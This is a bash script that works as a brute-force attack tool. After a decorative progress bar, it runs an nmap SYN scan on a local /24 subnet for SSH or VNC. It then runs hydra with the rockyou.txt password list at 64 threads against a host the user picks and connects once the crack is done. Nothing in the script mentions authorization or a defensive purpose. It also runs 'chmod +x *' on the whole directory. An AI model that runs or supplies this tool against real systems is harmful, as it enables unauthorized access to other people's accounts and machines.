#!/bin/bash
sudo rm -rf output.txt
clear
say "Loading"
echo "Loading..."
for ((k = 0; k <= 10; k++)); do
    echo -n "[ "
    for ((i = 0; i <= k; i++)); do echo -n "---"; done
    sleep 1
    for ((j = i; j <= 10; j++)); do echo -n "   "; done
    v=$((k * 10))
    echo -n " ] "
    echo -n "$v%" $'\r'
done
echo
chmod +x *

clear
say "Starting..."
echo 'Starting...'
function run() {
    clear
    read -p "Do you want SSH(22) or VNC(5900). To see all type (ALL): " service

    if [[ $service == "ALL" ]]; then
        sudo nmap -sS 192.168.1.1/24 --open
        say "Scan has completed"


    elif [[ $service == "all" ]]; then
        sudo nmap -sS 192.168.1.1/24 --open
        say "Scan has completed"

    else
        sudo nmap -sS 192.168.1.1/24 -p $service --open
        say "Scan has completed"

    fi

    echo "To crack VNC(5900) type 'NONE' in the input username"
    read -p "input username: " user
    read -p "input hostname: " host

    if [ $user == "NONE" ]; then
        hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://$host
        open vnc://$host
    else
        hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I ssh://$host
        ssh $user@$host
    fi
}
run